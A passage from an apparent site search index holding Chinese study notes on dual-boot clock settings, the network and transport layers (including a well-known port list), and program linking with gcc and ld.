on top of the one-shot action that ntpdate provided on boot and network activation, now timesyncd by default regularly checks and keeps your local time in sync. It also stores time updates locally, so that after reboots monotonically advances if applicable. -- https://help.ubuntu.com/lts/serverguide/NTP.html \u8fd8\u6709\uff1a --adjust-system-clock If set-local-rtc is invoked and this option is passed, the system clock is synchronized from the RTC again, taking the new setting into account. Otherwise, the RTC is synchronized from the system clock. -- http://manpages.ubuntu.com/manpages/disco/en/man1/timedatectl.1.html \u53e6\u5916\uff0c\u8fd8\u53ef\u4ee5\u4fee\u6539Windows\u7684\u7b56\u7565\uff0c\uff08\u5728\u5b58\u5728\u590f\u4ee4\u65f6\u7684\u65f6\u5019\u8fd9\u6837\u505a\u53ef\u80fd\u66f4\u597d \uff09\uff1a \u6253\u5f00\u547d\u4ee4\u884c\u7a0b\u5e8f\uff0c\u5728\u547d\u4ee4\u884c\u4e2d\u8f93\u5165\u4e0b\u9762\u547d\u4ee4\u5e76\u56de\u8f66 1 Reg add HKLM \\ SYSTEM \\ CurrentControlSet \\ Control \\ TimeZoneInformation / v RealTimeIsUniversal / t REG_DWORD / d 1 \u4f5c\u8005\uff1a\u6ed1\u7a3d \u94fe\u63a5\uff1a https://www.zhihu.com/question/46525639/answer/157272414 \u6765\u6e90\uff1a\u77e5\u4e4e \u8457\u4f5c\u6743\u5f52\u4f5c\u8005\u6240\u6709\u3002\u5546\u4e1a\u8f6c\u8f7d\u8bf7\u8054\u7cfb\u4f5c\u8005\u83b7\u5f97\u6388\u6743\uff0c\u975e\u5546\u4e1a\u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\u3002 \u5927\u6982\u5c31\u662f\u8fd9\u6837\u3002\u4e3b\u8981\u662f\u67d0\u4e9b\u65e7\u7684\u8bbe\u5b9a\u5df2\u7ecf\u5931\u6548\uff0c\u5e76\u4e14\u67d0\u4e9b\u53d1\u884c\u7248\u7684\u8bbe\u7f6e\u533a\u522b\u8f83\u5927\uff0c\u7279\u610f\u8bb0\u5f55\u4e00\u4e0b\u7ed9\u61d2\u4eba\u4eec\u3002","title":"Windows\u548cUbuntu\u53cc\u7cfb\u7edf\u4e0b\u7684\u65f6\u95f4\u95ee\u9898"},{"location":"reading_notes/computer_networking_a_top_down_approach/the_network_layer/","text":"\u5728\u672c\u7ae0\u4e2d\uff0c\u6211\u4eec\u5c06\u5bf9\u7f51\u7edc\u5c42\u7684 \u8f6c\u53d1\uff08forwarding\uff09 \u529f\u80fd\u548c \u8def\u7531\u9009\u62e9\uff08routing\uff09 \u529f\u80fd\u505a\u91cd\u8981\u533a\u5206\u3002\u8f6c\u53d1\u6d89\u53ca\u5206\u7ec4\u5728 \u5355\u4e00 \u7684\u8def\u7531\u5668\u4e2d\u4ece\u4e00\u6761\u5165\u94fe\u8def\u5230\u4e00\u6761\u51fa\u94fe\u8def\u7684\u4f20\u9001\u3002\u8def\u7531\u9009\u62e9\u6d89\u53ca\u4e00\u4e2a\u7f51\u7edc\u7684 \u6240\u6709 \u8def\u7531\u5668\uff0c\u5b83\u4eec\u7ecf\u8def\u7531\u9009\u62e9\u534f\u8bae\u5171\u540c\u4ea4\u4e92\uff0c\u4ee5\u51b3\u5b9a\u5206\u7ec4\u4ece\u6e90\u5230\u76ee\u7684\u5730\u7ed3\u70b9\u6240\u91c7\u7528\u7684\u8def\u5f84\u3002 4.1 \u6982\u8ff0 4.1.1 \u8f6c\u53d1\u548c\u8def\u7531\u9009\u62e9 \u7f51\u7edc\u5c42\u7684\u4f5c\u7528\u4ece\u8868\u9762\u4e0a\u770b\u6781\u4e3a\u7b80\u5355\uff0c\u5373\u5c06\u5206\u7ec4\u4ece\u4e00\u53f0\u53d1\u9001\u4e3b\u673a\u79fb\u52a8\u5230\u4e00\u53f0\u63a5\u6536\u4e3b\u673a\u3002\u4e3a\u6b64\uff0c\u9700\u8981\u4e24\u79cd\u91cd\u8981\u7684\u7f51\u7edc\u5c42\u529f\u80fd\u3002 \u8f6c\u53d1\u3002\u5f53\u4e00\u4e2a\u5206\u7ec4\u5230\u8fbe\u8def\u7531\u5668\u7684\u4e00\u6761\u8f93\u5165\u94fe\u8def\u65f6\uff0c\u8def\u7531\u5668\u5fc5\u987b\u5c06\u8be5\u5206\u7ec4\u79fb\u52a8\u5230\u9002\u5f53\u7684\u8f93\u51fa\u94fe\u8def\u3002 \u8def\u7531\u9009\u62e9\u3002\u5f53\u5206\u7ec4\u4ece\u53d1\u9001\u65b9\u6d41\u5411\u63a5\u6536\u65b9\u65f6\uff0c\u7f51\u7edc\u5c42\u5fc5\u987b\u51b3\u5b9a\u8fd9\u4e9b\u5206\u7ec4\u6240\u91c7\u7528\u7684\u8def\u7531\u6216\u8def\u5f84\u3002\u8ba1\u7b97\u8fd9\u4e9b\u8def\u5f84\u7684\u7b97\u6cd5\u88ab\u79f0\u4e3a \u8def\u7531\u9009\u62e9\u7b97\u6cd5\uff08routing algorithm\uff09 \u3002 \u7528\u9a7e\u9a76\u7684\u4f8b\u5b50\u8fdb\u884c\u7c7b\u6bd4\uff0c\u8003\u8651\u57281.3.1\u8282\u4e2d\u65c5\u884c\u8005\u6240\u5386\u7ecf\u7684\u4ece\u5bbe\u5915\u6cd5\u5c3c\u4e9a\u5dde\u5230\u4f5b\u7f57\u91cc\u8fbe\u5dde\u7684\u884c\u7a0b\u3002\u5728\u8fd9\u4e2a\u884c\u7a0b\u4e2d\uff0c\u8be5\u9a7e\u9a76\u5458\u5230\u4f5b\u7f57\u91cc\u8fbe\u5dde\u7ecf\u8fc7\u4e86\u9014\u4e2d\u7684\u8bb8\u591a\u7acb\u4ea4\u6865\u3002\u6211\u4eec\u80fd\u591f\u8ba4\u4e3a\u8f6c\u53d1\u5c31\u50cf\u901a\u8fc7\u5355\u4e2a\u7acb\u4ea4\u6865\u7684\u8fc7\u7a0b\uff1a\u4e00\u8f86\u6c7d\u8f66\u6cbf\u9053\u8def\u4e0a\u8fdb\u5165\u7acb\u4ea4\u6865\u7684\u4e00\u4e2a\u5165\u53e3\uff0c\u5e76\u4e14\u51b3\u5b9a\u5e94\u5f53\u8d70\u54ea\u6761\u8def\u6765\u79bb\u5f00\u8be5\u7acb\u4ea4\u6865\u3002\u6211\u4eec\u80fd\u591f\u8ba4\u4e3a\u8def\u7531\u9009\u62e9\u662f\u89c4\u5212\u4ece\u8d39\u57ce\u5230\u4f5b\u7f57\u91cc\u8fbe\u5dde\u884c\u7a0b\u7684\u8fc7\u7a0b\uff1a\u5728\u7740\u624b\u884c\u7a0b\u4e4b\u524d\uff0c\u9a7e\u9a76\u5458\u67e5\u9605\u5730\u56fe\u5e76\u5728\u8bb8\u591a\u53ef\u80fd\u7684\u8def\u5f84\u4e2d\u9009\u62e9\u5176\u4e2d\u4e00\u6761\uff0c\u5176\u4e2d\u6bcf\u6761\u8def\u5f84\u90fd\u7531\u4e00\u7cfb\u5217\u7ecf\u7acb\u4ea4\u6865\u94fe\u63a5\u7684\u8def\u6bb5\u7ec4\u6210\u3002 \u6bcf\u53f0\u8def\u7531\u5668\u5177\u6709\u4e00\u5f20 \u8f6c\u53d1\u8868\uff08forwarding table\uff09 \u3002\u8def\u7531\u5668\u901a\u8fc7\u68c0\u67e5\u5230\u8fbe\u5206\u7ec4\u9996\u90e8\u5b57\u6bb5\u7684\u503c\u6765\u8f6c\u53d1\u5206\u7ec4\uff0c\u7136\u540e\u4f7f\u7528\u8be5\u503c\u5728\u8be5\u8def\u7531\u5668\u7684\u8f6c\u53d1\u8868\u4e2d\u7d22\u5f15\u67e5\u8be2\u3002 \u6211\u4eec\u5c06\u7ea6\u5b9a\u672f\u8bed \u5206\u7ec4\u4ea4\u6362\u673a \u662f\u6307\u4e00\u53f0\u901a\u7528\u5206\u7ec4\u4ea4\u6362\u8bbe\u5907\uff0c\u5b83\u6839\u636e\u5206\u7ec4\u9996\u90e8\u5b57\u6bb5\u4e2d\u7684\u503c\uff0c\u4ece\u8f93\u5165\u94fe\u8def\u63a5\u53e3\u5230\u8f93\u51fa\u94fe\u8def\u63a5\u53e3\u8f6c\u79fb\u5206\u7ec4\u3002\u67d0\u4e9b\u5206\u7ec4\u4ea4\u6362\u673a\u79f0\u4e3a \u94fe\u8def\u5c42\u4ea4\u6362\u673a\uff08link-layer switches\uff09 \uff0c\u57fa\u4e8e\u94fe\u8def\u5c42\u5b57\u6bb5\u4e2d\u7684\u503c\u505a\u8f6c\u53d1\u51b3\u5b9a\u3002\u5176\u4ed6\u5206\u7ec4\u4ea4\u6362\u673a\u79f0\u4e3a \u8def\u7531\u5668\uff08router\uff09 \uff0c\u57fa\u4e8e\u7f51\u7edc\u5c42\u5b57\u6bb5\u4e2d\u7684\u503c\u505a\u8f6c\u53d1\u51b3\u5b9a\u3002\u5e02\u573a\u9500\u552e\u8d44\u6599\u7ecf\u5e38\u5c06\u5177\u6709\u4ee5\u592a\u7f51\u63a5\u53e3\u7684\u8def\u7531\u5668\u79f0\u4e3a\u201d\u4e09\u5c42\u4ea4\u6362\u673a\u201c\uff0c\u4f46\u5b83\u4eec\u5b9e\u9645\u4e0a\u662f\u4e09\u5c42\u8bbe\u5907\uff0c\u6df7\u6dc6\u4e86\u76f8\u5173\u6982\u5ff5\u3002 \u8fde\u63a5\u5efa\u7acb \u4f46\u6211\u4eec\u5f88\u5feb\u5c06\u770b\u5230\u5728\u67d0\u4e9b\u8ba1\u7b97\u673a\u7f51\u7edc\u4e2d\uff0c\u5b9e\u9645\u4e0a\u6709\u7b2c\u4e09\u79cd\u91cd\u8981\u7684\u7f51\u7edc\u529f\u80fd\uff0c\u5373 \u8fde\u63a5\u5efa\u7acb\uff08connection setup\uff09 \u3002 \u4ee5\u7c7b\u4f3c\u7684\u65b9\u5f0f\uff0c\u67d0\u4e9b\u7f51\u7edc\u5c42\u4f53\u7cfb\u7ed3\u6784\u5982ATM\u3001\u5e27\u4e2d\u7ee7\u3001MPLS\uff0c\u8981\u6c42\u4ece\u6e90\u5230\u76ee\u7684\u5730\u6cbf\u7740\u6240\u9009\u62e9\u7684\u8def\u5f84\u5f7c\u6b64\u63e1\u624b\uff0c\u4ee5\u4fbf\u5728\u7ed9\u5b9a\u6e90\u5230\u76ee\u7684\u5730\u8fde\u63a5\u4e2d\u7684\u7f51\u7edc\u5c42\u6570\u636e\u5206\u7ec4\u80fd\u591f\u5f00\u59cb\u6d41\u52a8\u4e4b\u524d\u5efa\u7acb\u8d77\u72b6\u6001\u3002\u5728\u7f51\u7edc\u5c42\uff0c\u8be5\u8fc7\u7a0b\u88ab\u79f0\u4e3a \u8fde\u63a5\u5efa\u7acb \u3002 4.1.2 \u7f51\u7edc\u670d\u52a1\u6a21\u578b \u7f51\u7edc\u670d\u52a1\u6a21\u578b\uff08network service model\uff09 \u5b9a\u4e49\u4e86\u5206\u7ec4\u5728\u53d1\u9001\u4e0e\u63a5\u6536\u7aef\u7cfb\u7edf\u4e4b\u95f4\u7684\u7aef\u5230\u7aef\u8fd0\u8f93\u7279\u6027\u3002 4.2 \u865a\u7535\u8def\u548c\u6570\u636e\u62a5\u7535\u8def \u4ec5\u5728\u7f51\u7edc\u5c42\u63d0\u4f9b\u8fde\u63a5\u670d\u52a1\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u6210\u4e3a \u865a\u7535\u8def\uff08Virtual-Circuit, VC\uff09\u7f51\u7edc \uff1b\u4ec5\u5728\u7f51\u7edc\u5c42\u63d0\u4f9b\u65e0\u8fde\u63a5\u670d\u52a1\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u79f0\u4e3a \u6570\u636e\u62a5\u7f51\u7edc\uff08datagram network\uff09 \u3002","title":"\u7b2c4\u7ae0 \u7f51\u7edc\u5c42"},{"location":"reading_notes/computer_networking_a_top_down_approach/the_network_layer/#41","text":"","title":"4.1 \u6982\u8ff0"},{"location":"reading_notes/computer_networking_a_top_down_approach/the_network_layer/#411","text":"\u7f51\u7edc\u5c42\u7684\u4f5c\u7528\u4ece\u8868\u9762\u4e0a\u770b\u6781\u4e3a\u7b80\u5355\uff0c\u5373\u5c06\u5206\u7ec4\u4ece\u4e00\u53f0\u53d1\u9001\u4e3b\u673a\u79fb\u52a8\u5230\u4e00\u53f0\u63a5\u6536\u4e3b\u673a\u3002\u4e3a\u6b64\uff0c\u9700\u8981\u4e24\u79cd\u91cd\u8981\u7684\u7f51\u7edc\u5c42\u529f\u80fd\u3002 \u8f6c\u53d1\u3002\u5f53\u4e00\u4e2a\u5206\u7ec4\u5230\u8fbe\u8def\u7531\u5668\u7684\u4e00\u6761\u8f93\u5165\u94fe\u8def\u65f6\uff0c\u8def\u7531\u5668\u5fc5\u987b\u5c06\u8be5\u5206\u7ec4\u79fb\u52a8\u5230\u9002\u5f53\u7684\u8f93\u51fa\u94fe\u8def\u3002 \u8def\u7531\u9009\u62e9\u3002\u5f53\u5206\u7ec4\u4ece\u53d1\u9001\u65b9\u6d41\u5411\u63a5\u6536\u65b9\u65f6\uff0c\u7f51\u7edc\u5c42\u5fc5\u987b\u51b3\u5b9a\u8fd9\u4e9b\u5206\u7ec4\u6240\u91c7\u7528\u7684\u8def\u7531\u6216\u8def\u5f84\u3002\u8ba1\u7b97\u8fd9\u4e9b\u8def\u5f84\u7684\u7b97\u6cd5\u88ab\u79f0\u4e3a \u8def\u7531\u9009\u62e9\u7b97\u6cd5\uff08routing algorithm\uff09 \u3002 \u7528\u9a7e\u9a76\u7684\u4f8b\u5b50\u8fdb\u884c\u7c7b\u6bd4\uff0c\u8003\u8651\u57281.3.1\u8282\u4e2d\u65c5\u884c\u8005\u6240\u5386\u7ecf\u7684\u4ece\u5bbe\u5915\u6cd5\u5c3c\u4e9a\u5dde\u5230\u4f5b\u7f57\u91cc\u8fbe\u5dde\u7684\u884c\u7a0b\u3002\u5728\u8fd9\u4e2a\u884c\u7a0b\u4e2d\uff0c\u8be5\u9a7e\u9a76\u5458\u5230\u4f5b\u7f57\u91cc\u8fbe\u5dde\u7ecf\u8fc7\u4e86\u9014\u4e2d\u7684\u8bb8\u591a\u7acb\u4ea4\u6865\u3002\u6211\u4eec\u80fd\u591f\u8ba4\u4e3a\u8f6c\u53d1\u5c31\u50cf\u901a\u8fc7\u5355\u4e2a\u7acb\u4ea4\u6865\u7684\u8fc7\u7a0b\uff1a\u4e00\u8f86\u6c7d\u8f66\u6cbf\u9053\u8def\u4e0a\u8fdb\u5165\u7acb\u4ea4\u6865\u7684\u4e00\u4e2a\u5165\u53e3\uff0c\u5e76\u4e14\u51b3\u5b9a\u5e94\u5f53\u8d70\u54ea\u6761\u8def\u6765\u79bb\u5f00\u8be5\u7acb\u4ea4\u6865\u3002\u6211\u4eec\u80fd\u591f\u8ba4\u4e3a\u8def\u7531\u9009\u62e9\u662f\u89c4\u5212\u4ece\u8d39\u57ce\u5230\u4f5b\u7f57\u91cc\u8fbe\u5dde\u884c\u7a0b\u7684\u8fc7\u7a0b\uff1a\u5728\u7740\u624b\u884c\u7a0b\u4e4b\u524d\uff0c\u9a7e\u9a76\u5458\u67e5\u9605\u5730\u56fe\u5e76\u5728\u8bb8\u591a\u53ef\u80fd\u7684\u8def\u5f84\u4e2d\u9009\u62e9\u5176\u4e2d\u4e00\u6761\uff0c\u5176\u4e2d\u6bcf\u6761\u8def\u5f84\u90fd\u7531\u4e00\u7cfb\u5217\u7ecf\u7acb\u4ea4\u6865\u94fe\u63a5\u7684\u8def\u6bb5\u7ec4\u6210\u3002 \u6bcf\u53f0\u8def\u7531\u5668\u5177\u6709\u4e00\u5f20 \u8f6c\u53d1\u8868\uff08forwarding table\uff09 \u3002\u8def\u7531\u5668\u901a\u8fc7\u68c0\u67e5\u5230\u8fbe\u5206\u7ec4\u9996\u90e8\u5b57\u6bb5\u7684\u503c\u6765\u8f6c\u53d1\u5206\u7ec4\uff0c\u7136\u540e\u4f7f\u7528\u8be5\u503c\u5728\u8be5\u8def\u7531\u5668\u7684\u8f6c\u53d1\u8868\u4e2d\u7d22\u5f15\u67e5\u8be2\u3002 \u6211\u4eec\u5c06\u7ea6\u5b9a\u672f\u8bed \u5206\u7ec4\u4ea4\u6362\u673a \u662f\u6307\u4e00\u53f0\u901a\u7528\u5206\u7ec4\u4ea4\u6362\u8bbe\u5907\uff0c\u5b83\u6839\u636e\u5206\u7ec4\u9996\u90e8\u5b57\u6bb5\u4e2d\u7684\u503c\uff0c\u4ece\u8f93\u5165\u94fe\u8def\u63a5\u53e3\u5230\u8f93\u51fa\u94fe\u8def\u63a5\u53e3\u8f6c\u79fb\u5206\u7ec4\u3002\u67d0\u4e9b\u5206\u7ec4\u4ea4\u6362\u673a\u79f0\u4e3a \u94fe\u8def\u5c42\u4ea4\u6362\u673a\uff08link-layer switches\uff09 \uff0c\u57fa\u4e8e\u94fe\u8def\u5c42\u5b57\u6bb5\u4e2d\u7684\u503c\u505a\u8f6c\u53d1\u51b3\u5b9a\u3002\u5176\u4ed6\u5206\u7ec4\u4ea4\u6362\u673a\u79f0\u4e3a \u8def\u7531\u5668\uff08router\uff09 \uff0c\u57fa\u4e8e\u7f51\u7edc\u5c42\u5b57\u6bb5\u4e2d\u7684\u503c\u505a\u8f6c\u53d1\u51b3\u5b9a\u3002\u5e02\u573a\u9500\u552e\u8d44\u6599\u7ecf\u5e38\u5c06\u5177\u6709\u4ee5\u592a\u7f51\u63a5\u53e3\u7684\u8def\u7531\u5668\u79f0\u4e3a\u201d\u4e09\u5c42\u4ea4\u6362\u673a\u201c\uff0c\u4f46\u5b83\u4eec\u5b9e\u9645\u4e0a\u662f\u4e09\u5c42\u8bbe\u5907\uff0c\u6df7\u6dc6\u4e86\u76f8\u5173\u6982\u5ff5\u3002","title":"4.1.1 \u8f6c\u53d1\u548c\u8def\u7531\u9009\u62e9"},{"location":"reading_notes/computer_networking_a_top_down_approach/the_network_layer/#_1","text":"\u4f46\u6211\u4eec\u5f88\u5feb\u5c06\u770b\u5230\u5728\u67d0\u4e9b\u8ba1\u7b97\u673a\u7f51\u7edc\u4e2d\uff0c\u5b9e\u9645\u4e0a\u6709\u7b2c\u4e09\u79cd\u91cd\u8981\u7684\u7f51\u7edc\u529f\u80fd\uff0c\u5373 \u8fde\u63a5\u5efa\u7acb\uff08connection setup\uff09 \u3002 \u4ee5\u7c7b\u4f3c\u7684\u65b9\u5f0f\uff0c\u67d0\u4e9b\u7f51\u7edc\u5c42\u4f53\u7cfb\u7ed3\u6784\u5982ATM\u3001\u5e27\u4e2d\u7ee7\u3001MPLS\uff0c\u8981\u6c42\u4ece\u6e90\u5230\u76ee\u7684\u5730\u6cbf\u7740\u6240\u9009\u62e9\u7684\u8def\u5f84\u5f7c\u6b64\u63e1\u624b\uff0c\u4ee5\u4fbf\u5728\u7ed9\u5b9a\u6e90\u5230\u76ee\u7684\u5730\u8fde\u63a5\u4e2d\u7684\u7f51\u7edc\u5c42\u6570\u636e\u5206\u7ec4\u80fd\u591f\u5f00\u59cb\u6d41\u52a8\u4e4b\u524d\u5efa\u7acb\u8d77\u72b6\u6001\u3002\u5728\u7f51\u7edc\u5c42\uff0c\u8be5\u8fc7\u7a0b\u88ab\u79f0\u4e3a \u8fde\u63a5\u5efa\u7acb \u3002","title":"\u8fde\u63a5\u5efa\u7acb"},{"location":"reading_notes/computer_networking_a_top_down_approach/the_network_layer/#412","text":"\u7f51\u7edc\u670d\u52a1\u6a21\u578b\uff08network service model\uff09 \u5b9a\u4e49\u4e86\u5206\u7ec4\u5728\u53d1\u9001\u4e0e\u63a5\u6536\u7aef\u7cfb\u7edf\u4e4b\u95f4\u7684\u7aef\u5230\u7aef\u8fd0\u8f93\u7279\u6027\u3002","title":"4.1.2 \u7f51\u7edc\u670d\u52a1\u6a21\u578b"},{"location":"reading_notes/computer_networking_a_top_down_approach/the_network_layer/#42","text":"\u4ec5\u5728\u7f51\u7edc\u5c42\u63d0\u4f9b\u8fde\u63a5\u670d\u52a1\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u6210\u4e3a \u865a\u7535\u8def\uff08Virtual-Circuit, VC\uff09\u7f51\u7edc \uff1b\u4ec5\u5728\u7f51\u7edc\u5c42\u63d0\u4f9b\u65e0\u8fde\u63a5\u670d\u52a1\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u79f0\u4e3a \u6570\u636e\u62a5\u7f51\u7edc\uff08datagram network\uff09 \u3002","title":"4.2 \u865a\u7535\u8def\u548c\u6570\u636e\u62a5\u7535\u8def"},{"location":"reading_notes/computer_networking_a_top_down_approach/transport_layer/","text":"\u4f20\u8f93\u5c42\u7684\u57fa\u672c\u6982\u5ff5 Transport layer The protocols of this layer provide host-to-host communication services for applications.[1] It provides services such as connection-oriented communication, reliability, flow control, and multiplexing. [1] RFC 1122 \u5957\u63a5\u5b57 \u7aef\u53e3 Port (computer networking) The port numbers are divided into three ranges: the well-known ports , the registered ports , and the dynamic or private ports . \u719f\u77e5\u7aef\u53e3 The well-known ports (also known as system ports) are those from 0 through 1023. The requirements for new assignments in this range are stricter than for other registrations,[2] examples include: 20: File Transfer Protocol (FTP) Data Transfer 21: File Transfer Protocol (FTP) Command Control 22: Secure Shell (SSH) Secure Login 23: Telnet remote login service, unencrypted text messages 25: Simple Mail Transfer Protocol (SMTP) E-mail routing 53: Domain Name System (DNS) service 80: Hypertext Transfer Protocol (HTTP) used in the World Wide Web 110: Post Office Protocol (POP3) 119: Network News Transfer Protocol (NNTP) 123: Network Time Protocol (NTP) 143: Internet Message Access Protocol (IMAP) Management of digital mail 161: Simple Network Management Protocol (SNMP) 194: Internet Relay Chat (IRC) 443: HTTP Secure (HTTPS) HTTP over TLS/SSL The registered ports are those from 1024 through 49151. IANA maintains the official list of well-known and registered ranges.[3] The dynamic or private ports are those from 49152 through 65535. One common use for this range is for ephemeral ports.","title":"\u7b2c3\u7ae0 \u4f20\u8f93\u5c42"},{"location":"reading_notes/computer_networking_a_top_down_approach/transport_layer/#_1","text":"Transport layer The protocols of this layer provide host-to-host communication services for applications.[1] It provides services such as connection-oriented communication, reliability, flow control, and multiplexing. [1] RFC 1122","title":"\u4f20\u8f93\u5c42\u7684\u57fa\u672c\u6982\u5ff5"},{"location":"reading_notes/computer_networking_a_top_down_approach/transport_layer/#_2","text":"","title":"\u5957\u63a5\u5b57"},{"location":"reading_notes/computer_networking_a_top_down_approach/transport_layer/#_3","text":"Port (computer networking) The port numbers are divided into three ranges: the well-known ports , the registered ports , and the dynamic or private ports .","title":"\u7aef\u53e3"},{"location":"reading_notes/computer_networking_a_top_down_approach/transport_layer/#_4","text":"The well-known ports (also known as system ports) are those from 0 through 1023. The requirements for new assignments in this range are stricter than for other registrations,[2] examples include: 20: File Transfer Protocol (FTP) Data Transfer 21: File Transfer Protocol (FTP) Command Control 22: Secure Shell (SSH) Secure Login 23: Telnet remote login service, unencrypted text messages 25: Simple Mail Transfer Protocol (SMTP) E-mail routing 53: Domain Name System (DNS) service 80: Hypertext Transfer Protocol (HTTP) used in the World Wide Web 110: Post Office Protocol (POP3) 119: Network News Transfer Protocol (NNTP) 123: Network Time Protocol (NTP) 143: Internet Message Access Protocol (IMAP) Management of digital mail 161: Simple Network Management Protocol (SNMP) 194: Internet Relay Chat (IRC) 443: HTTP Secure (HTTPS) HTTP over TLS/SSL The registered ports are those from 1024 through 49151. IANA maintains the official list of well-known and registered ranges.[3] The dynamic or private ports are those from 49152 through 65535. One common use for this range is for ephemeral ports.","title":"\u719f\u77e5\u7aef\u53e3"},{"location":"reading_notes/computer_systems_a_programmer_s_perspective/linking/","text":"\u94fe\u63a5 \uff08linking\uff09\u662f\u5c06\u5404\u79cd\u4ee3\u7801\u548c\u6570\u636e\u7247\u6bb5\u6536\u96c6\u5e76\u7ec4\u5408\u6210\u4e3a\u4e00\u4e2a\u5355\u4e00\u6587\u4ef6\u7684\u8fc7\u7a0b\uff0c\u8fd9\u4e2a\u6587\u4ef6\u53ef\u88ab \u52a0\u8f7d \uff08\u590d\u5236\uff09\u5230\u5185\u5b58\u5e76\u6267\u884c\u3002 7.1 \u7f16\u8bd1\u5668\u9a71\u52a8\u7a0b\u5e8f \u5927\u591a\u6570\u7f16\u8bd1\u7cfb\u7edf\u63d0\u4f9b \u7f16\u8bd1\u5668\u9a71\u52a8\u7a0b\u5e8f \uff08compiler driver\uff09\uff0c\u5b83\u4ee3\u8868\u7528\u6237\u5728\u9700\u8981\u65f6\u8c03\u7528\u8bed\u8a00\u9884\u5904\u7406\u5668\u3001\u7f16\u8bd1\u5668\u3001\u6c47\u7f16\u5668\u548c\u94fe\u63a5\u5668\u3002\u6bd4\u5982\uff0c\u8981\u7528GNU\u7f16\u8bd1\u7cfb\u7edf\u6784\u9020\u793a\u4f8b\u7a0b\u5e8f\uff0c\u6211\u4eec\u5c31\u8981\u901a\u8fc7\u5728shell\u4e2d\u8f93\u5165\u4e0b\u5217\u547d\u4ee4\u6765\u8c03\u7528GCC\u9a71\u52a8\u7a0b\u5e8f\uff1a 1 linux> gcc -Og -o prog main.c sum.c \u56fe7-2\u6982\u62ec\u4e86\u9a71\u52a8\u7a0b\u5e8f\u5728\u5c06\u793a\u4f8b\u7a0b\u5e8f\u4eceASCII\u7801\u6e90\u6587\u4ef6\u7ffb\u8bd1\u6210\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u65f6\u7684\u884c\u4e3a\u3002\uff08\u5982\u679c\u4f60\u60f3\u770b\u770b\u8fd9\u4e9b\u6b65\u9aa4\uff0c\u7528 -v \u9009\u9879\u6765\u8fd0\u884cGCC\u3002\uff09\u9a71\u52a8\u7a0b\u5e8f\u9996\u5148\u8fd0\u884cC\u9884\u5904\u7406\u5668\uff08cpp\uff09 1 \uff0c\u5b83\u5c06C\u7684\u6e90\u7a0b\u5e8fmain.c\u7ffb\u8bd1\u6210\u4e00\u4e2aASCII\u7801\u7684\u4e2d\u95f4\u6587\u4ef6main.i\uff1a 1 cpp [ other arguments ] main.c /tmp/main.i \u63a5\u4e0b\u6765\uff0c\u9a71\u52a8\u7a0b\u5e8f\u8fd0\u884cC\u7f16\u8bd1\u5668\uff08cc1\uff09\uff0c\u5b83\u5c06main.i\u7ffb\u8bd1\u6210\u4e00\u4e2aASCII\u6c47\u7f16\u8bed\u8a00\u6587\u4ef6main.s\uff1a 1 cc1 /tmp/main.i -Og [ other arguments ] -o /tmp/main.s \u7136\u540e\uff0c\u9a71\u52a8\u7a0b\u5e8f\u8fd0\u884c\u6c47\u7f16\u5668\uff08as\uff09\uff0c\u5b83\u5c06main.s\u7ffb\u8bd1\u6210\u4e00\u4e2a \u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\uff08relocatable object file\uff09 main.o\uff1a 1 as [ other arguments ] -o /tmp/main.o /tmp/main.s \u9a71\u52a8\u7a0b\u5e8f\u7ecf\u8fc7\u76f8\u540c\u7684\u8fc7\u7a0b\u751f\u6210sum.o\u3002\u6700\u540e\uff0c\u5b83\u8fd0\u884c\u94fe\u63a5\u5668ld\uff0c\u5c06main.o\u548csum.o\u4ee5\u53ca\u4e00\u4e9b\u5fc5\u8981\u7684\u7cfb\u7edf\u76ee\u6807\u6587\u4ef6\u7ec4\u5408\u8d77\u6765\uff0c\u521b\u5efa\u4e00\u4e2a \u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\uff08executable object file\uff09 prog\uff1a 1 ld -o prog [ system object file and args ] /tmp/main.o /tmp/sum.o shell\u8c03\u7528\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u4e00\u4e2a\u53eb\u505a \u52a0\u8f7d\u5668\uff08loader\uff09 \u7684\u51fd\u6570\uff0c\u5b83\u5c06\u53ef\u6267\u884c\u6587\u4ef6prog\u4e2d\u7684\u4ee3\u7801\u548c\u6570\u636e\u590d\u5236\u5230\u5185\u5b58\uff0c\u7136\u540e\u5c06\u63a7\u5236\u8f6c\u79fb\u5230\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u5f00\u5934\u3002 7.2 \u9759\u6001\u94fe\u63a5 \u5411Linux LD\u7a0b\u5e8f\u8fd9\u6837\u7684 \u9759\u6001\u94fe\u63a5\u5668\uff08static linker\uff09 \u4ee5\u4e00\u7ec4\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u548c\u547d\u4ee4\u884c\u53c2\u6570\u4e3a\u8f93\u5165\uff0c\u751f\u6210\u4e00\u4e2a\u5b8c\u5168\u94fe\u63a5\u7684\u3001\u53ef\u4ee5\u52a0\u8f7d\u548c\u8fd0\u884c\u7684\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u4e3a\u8f93\u51fa\u3002\u8f93\u5165\u7684\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u7531\u5404\u79cd \u5728\u67d0\u4e9bGCC\u7248\u672c\u4e2d\uff0c\u9884\u5904\u7406\u5668\u88ab\u96c6\u6210\u5230\u7f16\u8bd1\u5668\u9a71\u52a8\u7a0b\u5e8f\u4e2d\u3002 \u21a9","title":"\u7b2c7\u7ae0 \u94fe\u63a5"},{"location":"reading_notes/computer_systems_a_programmer_s_perspective/linking/#71","text":"\u5927\u591a\u6570\u7f16\u8bd1\u7cfb\u7edf\u63d0\u4f9b \u7f16\u8bd1\u5668\u9a71\u52a8\u7a0b\u5e8f \uff08compiler 